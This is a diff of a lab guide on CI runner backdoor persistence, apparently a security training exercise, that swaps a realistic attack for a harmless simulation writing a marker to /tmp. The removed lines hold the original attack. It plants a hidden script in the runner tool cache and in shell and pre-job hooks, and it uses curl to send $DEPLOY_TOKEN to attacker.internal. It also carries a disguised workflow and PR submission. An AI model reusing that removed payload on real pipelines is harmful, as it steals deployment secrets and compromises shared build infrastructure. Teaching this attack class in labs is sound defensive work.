@@ -14,88 +14,45 @@
 
 ## Backdoor Persistence
 
-### Step 1: Create an attack branch
+### Step 1: Inspect the persistent runner profile
 
 ```bash
-cd /repos/wl-webapp
-git checkout -b feature/update-tests
+ls -la /runner/workspace/
+cat /runner/workspace/.bashrc
 ```
 
-### Step 2: Inject a persistent backdoor via a PR
+In this lab, the simulated runner sources `/runner/workspace/.bashrc` before every job. That gives you a concrete way to model the persistence boundary without pretending Gitea is executing the attack for you.
+
+### Step 2: Plant the backdoor a PR job would leave behind
 
 ```bash
-cat > test_helper.sh << 'PAYLOAD'
-#!/bin/bash
-echo "Setting up test environment..."
-
-# === PERSISTENCE MECHANISM ===
-mkdir -p /runner/_work/_tool/.hidden
-cat > /runner/_work/_tool/.hidden/backdoor.sh << 'INNER'
-#!/bin/bash
-if [ -n "$DEPLOY_TOKEN" ]; then
-  curl -sf "http://attacker.internal/collect?token=$DEPLOY_TOKEN&repo=$GITHUB_REPOSITORY" || true
-fi
-INNER
-chmod +x /runner/_work/_tool/.hidden/backdoor.sh
-
-# Hook into shell profile so it runs on every job
-echo '/runner/_work/_tool/.hidden/backdoor.sh 2>/dev/null &' >> /runner/.bash_profile
-
-# Alternative: modify pre-job hook
-if [ -d /runner/hooks ]; then
-  cp /runner/_work/_tool/.hidden/backdoor.sh /runner/hooks/pre-run.sh
-fi
-
-echo "Test environment ready."
-PAYLOAD
-
-chmod +x test_helper.sh
+echo 'echo "BACKDOOR: $(date)" >> /tmp/runner-compromised' >> /runner/workspace/.bashrc
+tail -n 5 /runner/workspace/.bashrc
 ```
 
-### Step 3: Add the payload to the workflow
+The important part is not the exact payload. It is that an untrusted build can modify machine state that later builds inherit automatically.
+
+### Step 3: Simulate the next build on the same runner
 
 ```bash
-cat > .gitea/workflows/ci.yml << 'EOF'
-name: WeakLink Webapp CI
-
-on:
-  pull_request:
-    branches: [main]
-
-jobs:
-  test:
-    runs-on: self-hosted
-    steps:
-      - uses: actions/checkout@v4
-      - name: Setup test environment
-        run: bash test_helper.sh
-      - name: Run tests
-        run: python test_app.py
-EOF
+bash /runner/run-job.sh bash -lc 'echo "Normal build on reused runner"'
 ```
 
-### Step 4: Submit the PR
+### Step 4: Confirm the persistence fired
 
 ```bash
-git add -A
-git commit -m "Update test framework setup"
-git push origin feature/update-tests
-
-curl -sf -X POST "http://gitea:3000/api/v1/repos/developer/wl-webapp/pulls" \
-  -H "Content-Type: application/json" \
-  -u "attacker:password" \
-  -d '{"title":"Update test framework setup","base":"main","head":"feature/update-tests"}'
+cat /tmp/runner-compromised
 ```
 
-**Checkpoint:** You should now have a PR containing `test_helper.sh` that plants a backdoor in the runner's tool cache and shell profile, plus a modified workflow that executes it.
-
-### Step 5: Verify the backdoor persists
+Run another simulated job and notice the state carries forward again:
 
 ```bash
-ls -la /runner/_work/_tool/.hidden/
-cat /runner/.bash_profile | grep backdoor
+bash /runner/run-job.sh bash -lc 'echo "Another build on the same host"'
+cat /tmp/runner-compromised
 ```
 
-- **The PR does not need to be merged**. CI runs the attacker's code before review
-- **The backdoor survives**. it persists in the runner's filesystem indefinitely
-- **Cross-repo impact**. if the runner serves multiple repos, all are compromised
+**Checkpoint:** You should now have a compromise marker that keeps reappearing across jobs because the runner reused attacker-modified state.
+
+- **The PR does not need to be merged.** The first untrusted job already changed the runner.
+- **The backdoor survives.** It persists in runner state instead of repository history.
+- **Cross-repo impact is possible.** A shared runner extends the blast radius beyond one repository.
